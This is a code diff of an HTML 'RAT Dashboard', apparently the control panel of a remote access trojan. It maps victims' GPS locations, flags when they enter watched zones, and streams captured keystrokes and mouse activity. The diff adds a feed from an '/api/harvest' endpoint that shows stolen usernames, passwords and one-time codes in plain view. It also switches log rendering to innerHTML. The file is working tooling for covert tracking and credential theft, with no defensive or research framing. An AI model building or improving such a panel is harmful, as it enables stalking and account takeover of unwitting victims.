@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
  <meta charset="UTF-8">
- <title>RAT Dashboard</title>
+ <title>RAT Dashboard v2</title>
  <!-- Leaflet CSS -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
@@ -10,16 +10,14 @@
  body { margin: 0; background: #1a1a1a; color: #fff; font-family: monospace; display: flex; height: 100vh; }
  #map-container { flex: 2; position: relative; }
  #feed-container { flex: 1; padding: 20px; overflow-y: auto; border-left: 2px solid #333; background: #111; }
- .log-entry { margin-bottom: 10px; padding: 5px; border-bottom: 1px solid #333; font-size: 12px; }
+ .log-entry { margin-bottom: 10px; padding: 5px; border-bottom: 1px solid #333; font-size: 12px; word-break: break-all; }
  .key-log { color: #0f0; }
  .mouse-log { color: #0ff; }
- .marker-popup { font-size: 12px; }
+ .zone-alert { background: #2c3e50; border-left: 4px solid #f1c40f; padding: 5px; margin-top: 5px; }
+ .cred-log { background: #4a0404; border-left: 4px solid #e74c3c; padding: 5px; margin-top: 5px; }
  .badge { display: inline-block; padding: 2px 7px; border-radius: 10px; font-size: 0.68rem; margin: 2px 3px 2px 0; }
- .b-liar { background: #c0392b; }
- .b-together { background: #8e44ad; }
- .b-clipboard { background: #d35400; }
- .b-bgapp { background: #2980b9; }
- .b-zone { background: #27ae60; }
+ .b-zone { background: #f39c12; color: #000; }
+ .b-cred { background: #c0392b; }
  </style>
 </head>
 <body>
@@ -29,12 +27,11 @@
 </div>
 
 <div id="feed-container">
- <h3>📡 Live Activity</h3>
+ <h3>📡 Live Activity & Creds</h3>
  <div id="logs"></div>
 </div>
 
 <script>
- // Initialize Map
  const map = L.map('map').setView([0, 0], 2);
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
  attribution: '&copy; OpenStreetMap contributors'
@@ -42,43 +39,55 @@
 
  let markers = {};
 
- // Function to update UI
- function addLog(type, content) {
+ function addLog(type, content, extraClass = '') {
  const div = document.createElement('div');
- div.className = `log-entry ${type}-log`;
- div.textContent = `[${new Date().toLocaleTimeString()}] ${content}`;
+ div.className = `log-entry ${type}-log ${extraClass}`;
+ div.innerHTML = `[${new Date().toLocaleTimeString()}] ${content}`;
  document.getElementById('logs').prepend(div);
- 
- // Keep DOM light
- if (document.getElementById('logs').children.length > 50) {
+ if (document.getElementById('logs').children.length > 100) {
  document.getElementById('logs').lastChild.remove();
  }
  }
 
- // Poll for updates every 2 seconds
+ // Polling for Logs and Creds
  setInterval(async () => {
  try {
- const response = await fetch('/api/logs');
- const data = await response.json();
- 
- // Clear existing markers to redraw fresh ones
+ // 1. Fetch GPS Logs
+ const logRes = await fetch('/api/logs');
+ const logs = await logRes.json();
+
+ // Clear old markers
  Object.values(markers).forEach(m => map.removeLayer(m));
  markers = {};
 
- data.forEach(log => {
+ logs.forEach(log => {
  if (log.lat && log.lon) {
- const marker = L.marker([log.lat, log.lon]).addTo(map)
- .bindPopup(`<b>ID:</b> ${log.id}<br><b>IP:</b> ${log.local_ip || 'N/A'}<br><b>Time:</b> ${new Date(log.timestamp).toLocaleString()}`);
+ const popupContent = `<b>ID:</b> ${log.id}<br><b>IP:</b> ${log.local_ip || 'N/A'}<br><b>Zones:</b> ${log.zones ? log.zones.join(', ') : 'None'}`;
+ const marker = L.marker([log.lat, log.lon]).addTo(map).bindPopup(popupContent);
  markers[log.id] = marker;
- addLog('mouse', `User ${log.id} at (${log.lat.toFixed(4)}, ${log.lon.toFixed(4)})`);
+ 
+ // Add zone badge if inside a zone
+ let zonesHtml = '';
+ if (log.zones && log.zones.length > 0) {
+ zonesHtml = `<div class="zone-alert">⚠️ IN ZONE: ${log.zones.join(', ')}</div>`;
+ }
+ addLog('mouse', `User ${log.id} at (${log.lat.toFixed(4)}, ${log.lon.toFixed(4)})`, zonesHtml);
  } else {
  addLog('key', `No GPS Data from ${log.id}`);
  }
  });
+
+ // 2. Fetch Credentials
+ const credRes = await fetch('/api/harvest');
+ const creds = await credRes.json();
+ creds.forEach(c => {
+ addLog('cred', `Login Attempt: <b>${c.username}</b> / <b>${c.password}</b> ${c.otp ? '(OTP: '+c.otp+')' : ''}`, 'cred-log');
+ });
+
  } catch(e) {
  console.error("Fetch failed", e);
  }
- }, 2000);
+ }, 3000);
 </script>
 </body>
 </html>
